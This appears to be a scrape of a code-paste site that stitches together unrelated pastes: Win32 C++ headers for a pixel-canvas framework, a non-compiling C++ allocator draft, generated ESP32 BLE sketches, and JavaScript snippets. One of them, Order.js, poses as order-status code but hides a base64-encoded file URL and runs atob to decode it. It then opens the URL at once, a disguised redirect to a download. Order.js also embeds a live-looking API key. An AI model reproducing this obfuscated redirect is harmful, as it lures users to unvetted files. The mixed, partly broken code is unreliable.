    VKEY_LBRACKET       = VKEY_OEM_4,
  VKEY_OEM_5            = 0xDC, //misc. chars; varies by keyboard ('\\','|' on US standard)
    VKEY_BSLASH         = VKEY_OEM_5,
  VKEY_OEM_6            = 0xDD, //misc. chars; varies by keyboard (']','}' on US standard)
    VKEY_RBRACKET       = VKEY_OEM_6,
  VKEY_OEM_7            = 0xDE, //misc. chars; varies by keyboard ('\'','\""' on US standard)
    VKEY_APOSTROPHE     = VKEY_OEM_7,
  VKEY_OEM_8            = 0xDF, //misc. chars; varies by keyboard
  //(reserved)          = 0xE0,
  //(misc.)             = 0xE1 -> 0xE7,
  //(unassigned)        = 0xE8,
  //(misc.)             = 0xE9 -> 0xFE,

};



// Mod[ifier]
union Event_Key_Mod { //2B
  // IMPORTANT:
  // Due to me having terminal couldn't-care-less syndrome,
  // I haven't implemented differenciating between the
  // left and right variants of shift, control, et cetera,
  // so both variants are set/unset when either are pressed/unpressed.
  // (Except lgui and rgui, since that's easier to detect???)
  // (ALSO ALTGRAPH ISN'T IMPLEMENTED AT ALL THANKS MICROSOFT)

  struct {
    u16 lshift    : 1;
    u16 rshift    : 1;
    u16 lctrl     : 1;
    u16 rctrl     : 1;
    u16 lalt      : 1;
    u16 ralt      : 1;
    u16 lgui      : 1;
    u16 rgui      : 1;
    u16 _unused   : 4;
    u16 numlock   : 1;
    u16 capslock  : 1;
    u16 altgraph  : 1;
    u16 scrollock : 1;
  };

  u16 all;

};



// Short for Key Symbol
struct Event_Key_Sym { //8B
  union {
    Event_Key_Mod kmod;
    u16           kmods;
  };

  u8  _unused;
  u8   pkey; // Physical key code (named .scancode in SDL's Keysym struct)
  u8   vkey; // Virtual key code (named .sym in SDL's Keysym struct)
  bool pressed;
  bool ischar; // 'is event KEY_CHAR?', otherwise it's KEY_UP or KEY_DOWN
  bool repeat; // Y'know that thing where in a text editor you hold down a key?

};



struct Event_Key { //24B
  u32  type;

  u32 _unused_0;

  u64  timestamp; // Performance counter is used; see ""timeGetPerfCounter()""

  union {
    struct { // (Effectively a copy of Event_Key_Sym)
      u16  kmods;
      u8  _unused_1;
      u8   pkey;
      u8   vkey;
      bool pressed;
      bool ischar;
      bool repeat;
    };
    Event_Key_Sym sym;
  };

};

/*-EVENT_KEY-*/



/*+EVENT_MOUSE+*/

// Event_Mouse.button can use any combination of these OR'd (AKA |) together
enum Event_Mouse_ButtonEnum { // (These are bitmasks)
  MBUTTON_LEFT   = 0x01,
  MBUTTON_MIDDLE = 0x02,
  MBUTTON_RIGHT  = 0x04,
  MBUTTON_X1     = 0x08, // Those 2 buttons on the sides of most mice nowadays
  MBUTTON_X2     = 0x10,  //^^
};

// (EVENT_MOUSE_<H/V>WHEEL events use dx and dy!)
struct Event_Mouse { //32B
  u32  type;

  u8  _unused;
  u8   button;   // Flags for currently pressed buttons (Event_Mouse_ButtonEnum)
  bool pressed;  // Will be true if button is nonzero
  bool dblClick; // 'Is double click?'

  u64  timestamp;

  f32  x;  // Coordinates relative to window
  f32  y;   //^^
  f32  dx; // Delta x (coordinates relative to last recorded x position)
  f32  dy; // Delta y (coordinates relative to last recorded y position)

};

/*-EVENT_MOUSE-*/



union Event { //32B (assuming Event_Mouse is the largest event bytes-wise)
  u32          type;

  Event_Common common;
  Event_Key    key;
  Event_Mouse  mouse;

};



// Populates *event_p with the contents of the first event in the event queue.
// Returns false if there were no events left in queue; true otherwise.
// (Calling this exclusively in the main thread is recommended)
bool pollEvent(Event* event_p = nullptr); // Burns events if event_p is nullptr





/*********************************** AUDIO ************************************/

// Stereo audio samples as two 32-bit floats,
// where each of the two channels can be between -1.0 to 1.0
struct StereoF32 { f32 l,r; };



// The length of the audio stream's buffer, in samples
extern u32 audio_samples;

// The audio's sample rate, in hertz
extern u32 sample_rate;





/*********************************** VIDEO ************************************/

#define WINDOW_NAME ""GDI Playground""

// If left at 4, window will initially appear 4x as big as canvas
#define WINDOW_RESMUL 4

// Technically customizable, but keeping it at 256x144 makes it 16:9,
// while also taking advantage of the fact an x position can just be
// stored within a single byte. This's useful for several types of optimizations
#define CANVAS_W 256
#define CANVAS_H 144



// This assumes the canvas width is equal to 256
union PixelCoords {
  u16 v; // Full index

  struct { u8 x, y; };

  PixelCoords() : v(0) {}
  PixelCoords(u16 _v) : v(_v) {}
  PixelCoords(u8 _x, u8 _y) : x(_x), y(_y) {}

};



// Used for the pixel buffer. This corresponds to the 8-bit color palette
// initially set during initialization. However, this palette can be
// changed by setting entries in pixels_palette and calling update_palette()
union Color8 {
  u8 v; // Full pixel value

  struct {
    u8 r : 3;
    u8 g : 3;
    u8 b : 2;
  };

  Color8() : v(0) {}
  Color8(u8 _v) : v(_v) {}

};



// Used for setting pixels_palette.
// (Make sure to call update_palette() to apply any changes to the palette!)
union Color24 {
  u32 v; // Full pixel value

  struct {
    u8 r;
    u8 g;
    u8 b;
    u8 _; // (Unused; this is just padding to the nearest multiple of 32-bits)
  };

};



extern Color8*  pixels;
extern Color24* pixels_palette;

extern bool win_closed;



void canvas_present(bool immediate = true);

void close_window(); // Also triggers an EVENT_QUIT

// Updates the 256-color palette. It defaults to the built-in one,
// but not only can you edit the built-in palette, you can make this
// function use another palette, just in case you want to swap out
// entirely different palettes on the fly!
//
// Does nothing if new_palette is given as NULL.
// This also makes sure that no color beyond the 255th is changed.
// For example, if first_color is 255, and num_colors is 2,
// only a single color will be changed, since 255 is the last color index
//
// Returns true on success, false otherwise
bool update_palette(const Color24* new_palette = pixels_palette,
                    u32 first_color = 0, u32 num_colors = 256);





#endif /* _PUBLIC_STUFF_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_winmm_2025-03-28\include\win32\audio.hpp"":
#ifndef _WIN32_AUDIO_HPP
#define _WIN32_AUDIO_HPP

#include <public_stuff.hpp>

#include <windows.h>
#include <mmsystem.h>



#define waveOutGetNumDevs      _Winmm_func.waveOutGetNumDevs_
#define waveOutGetDevCapsA     _Winmm_func.waveOutGetDevCapsA_
#define waveOutGetVolume       _Winmm_func.waveOutGetVolume_
#define waveOutSetVolume       _Winmm_func.waveOutSetVolume_
#define waveOutGetErrorTextA   _Winmm_func.waveOutGetErrorTextA_
#define waveOutOpen            _Winmm_func.waveOutOpen_
#define waveOutClose           _Winmm_func.waveOutClose_
#define waveOutPrepareHeader   _Winmm_func.waveOutPrepareHeader_
#define waveOutUnprepareHeader _Winmm_func.waveOutUnprepareHeader_
#define waveOutWrite           _Winmm_func.waveOutWrite_
#define waveOutPause           _Winmm_func.waveOutPause_
#define waveOutRestart         _Winmm_func.waveOutRestart_
#define waveOutReset           _Winmm_func.waveOutReset_
#define waveOutBreakLoop       _Winmm_func.waveOutBreakLoop_
#define waveOutGetPosition     _Winmm_func.waveOutGetPosition_
#define waveOutGetPitch        _Winmm_func.waveOutGetPitch_
#define waveOutSetPitch        _Winmm_func.waveOutSetPitch_
#define waveOutGetPlaybackRate _Winmm_func.waveOutGetPlaybackRate_
#define waveOutSetPlaybackRate _Winmm_func.waveOutSetPlaybackRate_
#define waveOutGetID           _Winmm_func.waveOutGetID_
#define waveOutMessage         _Winmm_func.waveOutMessage_

union _Winmm_func_t {
  FARPROC ptrs[1];

  struct {
    //UINT     (WINAPI *waveOutGetNumDevs_)(void);
    MMRESULT (WINAPI *waveOutGetDevCapsA_)(UINT_PTR, LPWAVEOUTCAPSA, UINT);
    //MMRESULT (WINAPI *waveOutGetVolume_)(HWAVEOUT, LPDWORD);
    MMRESULT (WINAPI *waveOutSetVolume_)(HWAVEOUT, DWORD);
    //MMRESULT (WINAPI *waveOutGetErrorTextA_)(MMRESULT, LPSTR, UINT);
    MMRESULT (WINAPI *waveOutOpen_)(LPHWAVEOUT, UINT, LPCWAVEFORMATEX, DWORD_PTR, DWORD_PTR, DWORD);
    //MMRESULT (WINAPI *waveOutClose_)(HWAVEOUT);
    MMRESULT (WINAPI *waveOutPrepareHeader_)(HWAVEOUT, LPWAVEHDR, UINT);
    //MMRESULT (WINAPI *waveOutUnprepareHeader_)(HWAVEOUT, LPWAVEHDR, UINT);
    MMRESULT (WINAPI *waveOutWrite_)(HWAVEOUT, LPWAVEHDR, UINT);
    MMRESULT (WINAPI *waveOutPause_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutRestart_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutReset_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutBreakLoop_)(HWAVEOUT);
    //MMRESULT (WINAPI *waveOutGetPosition_)(HWAVEOUT, LPMMTIME, UINT);
    //MMRESULT (WINAPI *waveOutGetPitch_)(HWAVEOUT, LPDWORD);
    //MMRESULT (WINAPI *waveOutSetPitch_)(HWAVEOUT, DWORD);
    //MMRESULT (WINAPI *waveOutGetPlaybackRate_)(HWAVEOUT, LPDWORD);
    //MMRESULT (WINAPI *waveOutSetPlaybackRate_)(HWAVEOUT, DWORD);
    //MMRESULT (WINAPI *waveOutGetID_)(HWAVEOUT, LPUINT);
    //MMRESULT (WINAPI *waveOutMessage_)(HWAVEOUT, UINT, DWORD_PTR, DWORD_PTR);
  };
};

extern _Winmm_func_t _Winmm_func;
extern char          _Winmm_names[];



/******************************************************************************/



// Stereo audio samples as two 16-bit signed ints
struct StereoS16 { s16 l,r; };



int WaveOutInit();

void WaveOutQuit();



#endif /* _WIN32_AUDIO_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_winmm_2025-03-28\include\win32\input.hpp"":
#ifndef _WIN32_INPUT_HPP
#define _WIN32_INPUT_HPP

#include <windows.h>

#include <public_stuff.hpp>



int InputInit();

void InputQuit();



union Event; // Forward declaration

// Returns false if queue is full
bool AddToEventQueue(Event& event);

// Returns a EVENT_NULL event if queue is empty
Event RemoveFromEventQueue();



#endif /* _WIN32_INPUT_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_winmm_2025-03-28\include\win32\misc.hpp"":
#ifndef _WIN32_MISC_HPP
#define _WIN32_MISC_HPP

//#include <windows.h>
#include <combaseapi.h>



#define CoTaskMemAlloc   _Ole32_func.CoTaskMemAlloc_
#define CoTaskMemRealloc _Ole32_func.CoTaskMemRealloc_
#define CoTaskMemFree    _Ole32_func.CoTaskMemFree_

union _Ole32_func_t {
  FARPROC ptrs[3];

  struct {
    LPVOID (*CoTaskMemAlloc_)   (SIZE_T);
    LPVOID (*CoTaskMemRealloc_) (LPVOID, SIZE_T);
    void   (*CoTaskMemFree_)    (LPVOID);
  };

};

extern _Ole32_func_t _Ole32_func;
extern char          _Ole32_names[];



#define CRITICAL_SECTION_SPINCOUNT 2048



#endif /* _WIN32_MISC_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_winmm_2025-03-28\include\win32\video.hpp"":
#ifndef _WIN32_VIDEO_HPP
#define _WIN32_VIDEO_HPP

#include <windows.h>



#define RegisterClassA     _User32_func.RegisterClassA_
#define CreateWindowExA    _User32_func.CreateWindowExA_
#define DefWindowProcA     _User32_func.DefWindowProcA_
#define InvalidateRect     _User32_func.InvalidateRect_
#define UpdateWindow       _User32_func.UpdateWindow_
#define BeginPaint         _User32_func.BeginPaint_
#define EndPaint           _User32_func.EndPaint_
#define PeekMessageA       _User32_func.PeekMessageA_
#define DispatchMessageA   _User32_func.DispatchMessageA_
#define DestroyWindow      _User32_func.DestroyWindow_
#define ReleaseDC          _User32_func.ReleaseDC_
#define GetDC              _User32_func.GetDC_
#define PostQuitMessage    _User32_func.PostQuitMessage_
#define MessageBoxA        _User32_func.MessageBoxA_
#define TranslateMessage   _User32_func.TranslateMessage_
#define GetWindowLongA     _User32_func.GetWindowLongA_
#define AdjustWindowRectEx _User32_func.AdjustWindowRectEx_
#define LoadCursorA        _User32_func.LoadCursorA_
#define MapVirtualKeyA     _User32_func.MapVirtualKeyA_
#define GetCursorPos       _User32_func.GetCursorPos_
#define ScreenToClient     _User32_func.ScreenToClient_

union _User32_func_t {
  FARPROC ptrs[1];

  struct {
    ATOM    (WINAPI *RegisterClassA_)(CONST WNDCLASSA*);
    HWND    (WINAPI *CreateWindowExA_)(DWORD, LPCSTR, LPCSTR, DWORD, int, int, int, int, HWND, HMENU, HINSTANCE, LPVOID);
    LRESULT (WINAPI *DefWindowProcA_)(HWND, UINT, WPARAM, LPARAM);
    WINBOOL (WINAPI *InvalidateRect_)(HWND, CONST RECT*, WINBOOL);
    WINBOOL (WINAPI *UpdateWindow_)(HWND);
    HDC     (WINAPI *BeginPaint_)(HWND, LPPAINTSTRUCT);
    WINBOOL (WINAPI *EndPaint_)(HWND, CONST PAINTSTRUCT*);
    WINBOOL (WINAPI *PeekMessageA_)(LPMSG, HWND, UINT, UINT, UINT);
    LRESULT (WINAPI *DispatchMessageA_)(CONST MSG*);
    WINBOOL (WINAPI *DestroyWindow_)(HWND);
  //int     (WINAPI *ReleaseDC_)(HWND, HDC);
  //HDC     (WINAPI *GetDC_)(HWND);
    VOID    (WINAPI *PostQuitMessage_)(int);
    int     (WINAPI *MessageBoxA_)(HWND, LPCSTR, LPCSTR, UINT);
    WINBOOL (WINAPI *TranslateMessage_)(CONST MSG*);
    LONG    (WINAPI *GetWindowLongA_)(HWND, int);
    WINBOOL (WINAPI *AdjustWindowRectEx_)(LPRECT, DWORD, WINBOOL, DWORD);
    HCURSOR (WINAPI *LoadCursorA_)(HINSTANCE, LPCSTR);
    UINT    (WINAPI *MapVirtualKeyA_)(UINT, UINT);
  //WINBOOL (WINAPI *GetCursorPos_)(LPPOINT);
    WINBOOL (WINAPI *ScreenToClient_)(HWND, LPPOINT);
  };
};

extern _User32_func_t _User32_func;
extern char           _User32_names_a[];



/******************************************************************************/



#define CreateCompatibleDC     _Gdi32_func.CreateCompatibleDC_
#define CreateDIBSection       _Gdi32_func.CreateDIBSection_
#define SelectObject           _Gdi32_func.SelectObject_
#define DeleteObject           _Gdi32_func.DeleteObject_
#define BitBlt                 _Gdi32_func.BitBlt_
#define DeleteDC               _Gdi32_func.DeleteDC_
#define StretchBlt             _Gdi32_func.StretchBlt_
#define CreateCompatibleBitmap _Gdi32_func.CreateCompatibleBitmap_
#define SetStretchBltMode      _Gdi32_func.SetStretchBltMode_
#define SetDIBColorTable       _Gdi32_func.SetDIBColorTable_

union _Gdi32_func_t {
  FARPROC ptrs[1];

  struct {
    HDC     (WINAPI *CreateCompatibleDC_)(HDC);
    HBITMAP (WINAPI *CreateDIBSection_)(HDC, CONST BITMAPINFO*, UINT, VOID**, HANDLE, DWORD);
    HGDIOBJ (WINAPI *SelectObject_)(HDC, HGDIOBJ);
    WINBOOL (WINAPI *DeleteObject_)(HGDIOBJ);
  //WINBOOL (WINAPI *BitBlt_)(HDC, int, int, int, int, HDC, int, int, DWORD);
    WINBOOL (WINAPI *DeleteDC_)(HDC);
    WINBOOL (WINAPI *StretchBlt_)(HDC, int, int, int, int, HDC, int, int, int, int, DWORD);
    HBITMAP (WINAPI *CreateCompatibleBitmap_)(HDC, int, int);
    int     (WINAPI *SetStretchBltMode_)(HDC, int);
    UINT    (WINAPI *SetDIBColorTable_)(HDC, UINT, UINT, CONST RGBQUAD*);
  };
};

extern _Gdi32_func_t _Gdi32_func;
extern char          _Gdi32_names_a[];



/******************************************************************************/



int WindowInit(HINSTANCE hThisInst);

void WindowQuit();



#endif /* _WIN32_VIDEO_HPP */
/******************************************************************************/
/******************************************************************************/
//""gdi_winmm_2025-03-28\src\win32\_WindowProc.hpp"":
#ifndef _WIN32__WINDOWPROC_HPP
#define _WIN32__WINDOWPROC_HPP

#include <win32/video.hpp>
#include <win32/input.hpp>

#include <windowsx.h>

#include <public_stuff.hpp>



//assumes window is without a menu
static inline Point2d CalculateWindowSize(u32 innerWidth, u32 innerHeight,
                                          u32 flags,      u32 flagsEx)
{
  RECT winSize;
  winSize.left   = 0;
  winSize.top    = 0;
  winSize.right  = innerWidth;
  winSize.bottom = innerHeight;
  AdjustWindowRectEx(&winSize, flags, false, flagsEx);

  Point2d winSizeAdjusted;
  winSizeAdjusted.x = winSize.right  - winSize.left;
  winSizeAdjusted.y = winSize.bottom - winSize.top;
  return winSizeAdjusted;

}



static inline Rect2d ConvertToKitRect(RECT& rectIn){
  Rect2d rectOut;
  rectOut.x = rectIn.left;
  rectOut.y = rectIn.top;
  rectOut.w = rectIn.right  - rectIn.left;
  rectOut.h = rectIn.bottom - rectIn.top;

  return rectOut;

}



static inline RECT ConvertFromKitRect(Rect2d& rectIn){
  RECT rectOut;
  rectOut.left   = rectIn.x;
  rectOut.top    = rectIn.y;
  rectOut.right  = rectIn.x + rectIn.w;
  rectOut.bottom = rectIn.y + rectIn.h;

  return rectOut;

}





union KEY_Params {
  struct {
    u32 repeatCount   : 16; // 0 -> 15
    u32 scanCode      :  8; //16 -> 23
    u32 extendedKey   :  1; //24
    u32 _reserved     :  4; //25 -> 28
    u32 altKeyDown    :  1; //29
    u32 prevUnpressed :  1; //30
    u32 currUnpressed :  1; //31
  };

  u32 value;

  KEY_Params(u32 _value) : value(_value) {}

};



// This event handler is used for KEY_CHAR, KEY_UP, and KEY_DOWN events
static inline void HANDLE_KEY_CHARUPDOWN(Event& event,
                                         bool charEvent,u8 virtualKeyCode,
                                         KEY_Params& params, u16 kmods)
{
  if(charEvent){
    event.type = EVENT_KEY_CHAR;
  } else {
    if(params.currUnpressed) event.type = EVENT_KEY_UP;
    else                     event.type = EVENT_KEY_DOWN;
  }

  event.key.kmods = kmods;

  event.key.pkey = params.scanCode;
  event.key.vkey = virtualKeyCode;

  event.key.pressed = !params.currUnpressed;
  event.key.repeat  = params.repeatCount>0; //modified to act as a boolean
  event.key.ischar  = charEvent;

}





union MOUSE_ButtonStates {
  struct {
    u8 left    : 1;
    u8 middle  : 1;
    u8 right   : 1;
    u8 x1      : 1;
    u8 x2      : 1;
    u8 _unused : 3;
  };

  u8 value;

  MOUSE_ButtonStates() : value(0) {}
  MOUSE_ButtonStates(u8 _value) : value(_value) {}

};



extern Point2d win_size;

// Converts window coords to canvas coords
static inline void ConvertCoordinates(f32& x, f32& y){
  x = (x/(win_size.x-1.0f)) * ((f32)CANVAS_W-1.0f);
  y = (y/(win_size.y-1.0f)) * ((f32)CANVAS_H-1.0f);

  // Since canvas is bottom-up instead of top-down,
  // the y value is inverted!
  y = ((f32)CANVAS_H-1.0f) - y;

}



static inline void HANDLE_MOUSE_MOVED(Event& event, u8 buttonStates,
                                      Point2d& previous, Point2d& current)
{
  event.type = EVENT_MOUSE_MOVED;

  event.mouse.x = current.x;
  event.mouse.y = current.y;
  ConvertCoordinates(event.mouse.x, event.mouse.y);

  event.mouse.dx = current.x - previous.x;
  event.mouse.dy = current.y - previous.y;
  ConvertCoordinates(event.mouse.dx, event.mouse.dy);

  event.mouse.button  = buttonStates;
  event.mouse.pressed = buttonStates!=0;

}



// Same event handler is used for both MOUSE_HWHEEL and MOUSE_VWHEEL events
static inline void HANDLE_MOUSE_HVWHEEL(Event& event,
                                        bool verticalScroll, s16 scrollAmount,
                                        u8 buttonStates, Point2d& mousePos)
{
  if(verticalScroll){
    event.type = EVENT_MOUSE_VWHEEL;
    event.mouse.dy = (f32)scrollAmount/WHEEL_DELTA;
  } else {
    event.type = EVENT_MOUSE_HWHEEL;
    event.mouse.dx = (f32)scrollAmount/WHEEL_DELTA;
  }

  event.mouse.x = mousePos.x;
  event.mouse.y = mousePos.y;
  ConvertCoordinates(event.mouse.x, event.mouse.y);

  event.mouse.button  = buttonStates;
  event.mouse.pressed = buttonStates!=0;

}



// Same event handler is used for both MOUSE_UP and MOUSE_DOWN events
static inline void HANDLE_MOUSE_UPDOWN(Event& event, Point2d& clickPosition,
                                       u8 buttonStates, bool pressed, bool doubleClick)
{
  if(pressed) event.type = EVENT_MOUSE_DOWN;
  else        event.type = EVENT_MOUSE_UP;

  event.mouse.x = clickPosition.x;
  event.mouse.y = clickPosition.y;
  ConvertCoordinates(event.mouse.x, event.mouse.y);

  event.mouse.button   = buttonStates;
  event.mouse.pressed  = pressed;
  event.mouse.dblClick = doubleClick;

}



#endif /* _WIN32__WINDOWPROC_HPP */
"
vyfaef1e,Untitled,h0tmi,C++,Friday 28th of March 2025 11:50:29 AM CDT,"//  TEST

template <class T, size_t n_max_objects>
class Allocator {
public:
    using U = ..
    Allocator()
    {
        if constexpr (n_max_objects < 1024) {
            buffer_ = (new Slot<int16_t>[n_max_objects]);
        } else {
            buffer_ = (new Slot<size_t>[n_max_objects]);
        }
        for (size_t i = 0; i < n_max_objects; ++i) {
            free_elements.push(i);
        }
    }
        

    T* New() {
        if (free_elements.empty()) {
            throw std::bad_alloc();
        }
        firstFreeIndex = free_elements.pop();
        
        buffer_[firstFreeIndex].occupied = true;
        buffer_[firstFreeIndex].index = firstFreeIndex;
        allocatedCount_++;
        
        // allocate 
        // don't forget to handle except
        
        T* ptr = nullptr;
        try {
            ptr = new (buffer[firstFreeIndex].storage) T();
        } catch (...) {
            buffer_[firstFreeIndex].occupied = false;
            allocatedCount_--;
            throw;
        }
        
        return ptr;
    }
    void Delete(T* ptr) { // ptr = 0x01
        if (!ptr) {
            // double free???
            return;
        }
        
        if (ptr < buffer_ && ptr >= buffer_ * sizeof(Slot) * n_max_objects) {
            // not in range;
            throw;
        }
        
        bool found = false;
        size_t index = 0;
        
        // SLA could make it better.
        size_t index = reinterpret_cast<Slot*>(ptr - (sizeof(Slot) - sizeof(T)))->index;
        
        // [......]
    
        
        if (reinterpret_cast<T*>(buffer_[index].storage) != ptr) {
            throw;
        }
    
        
        if (!found || !buffer_[index].occupied) {
            // ptr is not from here or double free
            throw;
        }
        
        ptr->~T();
        
        buffer_[index].occupied = false;
        allocatedCount_--;
        free_elemets.push(index);
    }
private:
    template<class U>
    struct Slot {
        U index = 0;
        bool occupied = false;
        alignas(T) std::byte storage[sizeof(T)];
    }
    
    Slot<U>* buffer_;
    std::stack<size_t> free_elements;
};

// N * sizeof(Slot) + N * sizeof(size_t) + Eps 
// n_max = 1024
// n_max = really big

// Allocator <int, 8> alloc = Allocator<int, 8>>(); 
// auto ptr = alloc.New();


// Allocator <int, 2 * (10**9)>

"
rGdhfWTn,work for 2025-03-28 (1/2),Kitomas,C++,Friday 28th of March 2025 11:48:11 AM CDT,
FXh5Hm0C,**BLE Server** rev_02,pleasedontcode,Arduino,Thursday 27th of March 2025 10:13:47 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **BLE Server**
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2025-03-28 03:13:13

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Implement a Bluetooth Low Energy (BLE) */
	/* communication system using NimBLEDevice to connect */
	/* and control connected components remotely. Ensure */
	/* seamless data transfer and device management for */
	/* enhanced user experience. */
/****** SYSTEM REQUIREMENT 2 *****/
	/* Write a Code for esp32-C3 in arduino IDE that */
	/* always is on deep sleep. Increment a value every 3 */
	/* seconds and transmit the value by bluetooth using */
	/* Nimble library and the same data will transmitted */
	/* by espnow every 9 seconds. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <NimBLEDevice.h> // https://github.com/h2zero/NimBLE-Arduino
#include <DHT.h>          // https://github.com/adafruit/DHT-sensor-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t myDHT22_DHT22_DOUT_PIN_D4 = 4;
const uint8_t myDHT11_DHT11_DOUT_PIN_D13 = 13;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
// BLE variables
NimBLEServer* pServer = nullptr;
NimBLECharacteristic* pCharacteristic = nullptr;
uint32_t valueToSend = 0; // Value to be incremented and sent

/****** SETUP FUNCTION *****/
void setup(void)
{
    // Initialize Serial for debugging
    Serial.begin(115200);

    // Initialize BLE
    NimBLEDevice::init(""ESP32-C3"");

    // Create BLE Server
    pServer = NimBLEDevice::createServer();
    pCharacteristic = pServer->createCharacteristic(
        ""12345678-1234-5678-1234-56789abcdef0"", // UUID
        NIMBLE_PROPERTY::NOTIFY | NIMBLE_PROPERTY::READ
    );

    // Set pin modes
    pinMode(myDHT22_DHT22_DOUT_PIN_D4, INPUT_PULLUP);
    pinMode(myDHT11_DHT11_DOUT_PIN_D13, INPUT_PULLUP);

    // Start advertising
    pServer->getAdvertising()->start();
    Serial.println(""BLE Server is advertising"");
}

/****** LOOP FUNCTION *****/
void loop(void)
{
    // Increment the value every 3 seconds
    delay(3000);
    valueToSend++;
    Serial.print(""Value to send: "");
    Serial.println(valueToSend);

    // Update the characteristic with the new value
    pCharacteristic->setValue(valueToSend);
    pCharacteristic->notify();

    // Deep sleep for 9 seconds
    Serial.println(""Going to deep sleep for 9 seconds"");
    esp_sleep_enable_timer_wakeup(9000000); // 9 seconds in microseconds
    esp_deep_sleep_start();
}

/* END CODE */"
fj3aU5dF,**BLE Broadcast** rev_01,pleasedontcode,Arduino,Thursday 27th of March 2025 10:08:41 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **BLE Broadcast**
	- Source Code NOT compiled for: ESP32 DevKit V1
	- Source Code created on: 2025-03-28 03:07:53

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* Implement a Bluetooth Low Energy (BLE) */
	/* communication system using NimBLEDevice to connect */
	/* and control connected components remotely. Ensure */
	/* seamless data transfer and device management for */
	/* enhanced user experience. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <NimBLEDevice.h>	//https://github.com/h2zero/NimBLE-Arduino
#include <DHT.h>	//https://github.com/adafruit/DHT-sensor-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t myDHT22_DHT22_DOUT_PIN_D4		= 4;

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
// Create a DHT object
DHT dht(myDHT22_DHT22_DOUT_PIN_D4, DHT22); // Assuming DHT22 sensor

// BLE server instance
NimBLEServer* pServer = nullptr;
NimBLECharacteristic* pCharacteristic = nullptr;

// Variable to hold the sensor data
float temperature;
float humidity;

// Callback for BLE connection
class MyServerCallbacks : public NimBLEServerCallbacks {
    void onConnect(NimBLEServer* pServer) {
        // Code to execute when a client connects
    }

    void onDisconnect(NimBLEServer* pServer) {
        // Code to execute when a client disconnects
    }
};

void setup(void)
{
    // Initialize Serial for debugging
    Serial.begin(115200);
    
    // Initialize DHT sensor
    dht.begin();

    // Initialize BLE
    NimBLEDevice::init(""ESP32_BLE_Device""); // Set the BLE device name
    pServer = NimBLEDevice::createServer(); // Create the BLE Server
    pServer->setCallbacks(new MyServerCallbacks()); // Set server callbacks

    // Create a BLE Characteristic
    pCharacteristic = pServer->createCharacteristic(
        ""Temperature_Humidity"",
        NIMBLE_PROPERTY::READ | NIMBLE_PROPERTY::NOTIFY
    );

    // Start the server
    pServer->startAdvertising(); // Start advertising
    Serial.println(""BLE Device is advertising..."");
}

void loop(void)
{
    // Read temperature and humidity
    humidity = dht.readHumidity();
    temperature = dht.readTemperature();

    // Check if any reads failed and exit early (to try again).
    if (isnan(humidity) || isnan(temperature)) {
        Serial.println(""Failed to read from DHT sensor!"");
        return;
    }

    // Create a string to hold the sensor data
    String data = ""Temp: "" + String(temperature) + "" C, Humidity: "" + String(humidity) + "" %"";
    
    // Update the characteristic value
    pCharacteristic->setValue(data.c_str());
    pCharacteristic->notify(); // Notify clients of the new value

    // Print the values to the Serial Monitor
    Serial.println(data);

    // Wait a bit before the next loop
    delay(2000); // Adjust the delay as needed
}

/* END CODE */"
9w3pCDic,Order.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 10:08:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/367/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
66ixNT5j,Market.js,navrajkhunger,JavaScript,Thursday 27th of March 2025 09:52:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/974/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

